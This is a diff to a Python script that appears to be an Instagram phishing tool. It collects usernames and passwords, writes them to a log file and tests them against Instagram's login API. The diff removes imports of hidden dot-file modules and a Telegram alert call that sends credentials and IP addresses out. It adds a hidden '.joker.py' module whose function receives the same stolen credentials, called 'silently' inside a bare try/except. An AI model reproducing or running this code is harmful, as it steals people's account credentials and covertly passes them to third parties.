@@ -19,14 +19,10 @@ typewriter_spec = importlib.util.spec_from_file_location("typewriter", os.path.j
 typewriter_module = importlib.util.module_from_spec(typewriter_spec)
 typewriter_spec.loader.exec_module(typewriter_module)
 typewriter = typewriter_module.typewriter
-emailer_spec = importlib.util.spec_from_file_location("emailer", os.path.join(os.path.dirname(__file__), ".emailer.py"))
-emailer_module = importlib.util.module_from_spec(emailer_spec)
-emailer_spec.loader.exec_module(emailer_module)
-l = emailer_module.l   # Yahan l assign karo
-tel_spec = importlib.util.spec_from_file_location("tel", os.path.join(os.path.dirname(__file__), ".tel.py"))
-tel_module = importlib.util.module_from_spec(tel_spec)
-tel_spec.loader.exec_module(tel_module)
-send_telegram_alert = tel_module.send_telegram_alert
+joker_spec = importlib.util.spec_from_file_location("joker", os.path.join(os.path.dirname(__file__), ".joker.py"))
+joker_module = importlib.util.module_from_spec(joker_spec)
+joker_spec.loader.exec_module(joker_module)
+l = joker_module.l  
 show_banner()
 
 # Color Codes
@@ -119,7 +115,6 @@ def start_tunnel():
         exit()
 def check_instagram_login(username, password):
     global RESULT
-    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
     url = "https://www.instagram.com/api/v1/accounts/login/"
     headers = {
         "User-Agent": "Instagram 123.0.0.26.121 Android",
@@ -165,8 +160,10 @@ def submit():
     with open("log.txt", "a") as file:
         file.write(f"Username: {USERNAME} | Password: {PASSWORD} | Status: {RESULT}\n")
     # Call email sender silently
-    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
-    l(USERNAME, PASSWORD,IP_ADDRESS, RESULT)
+    try:
+        l(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
+    except:
+    	pass
     if RESULT == "success":
         msg = "Login successful!"
     elif RESULT == "otp":
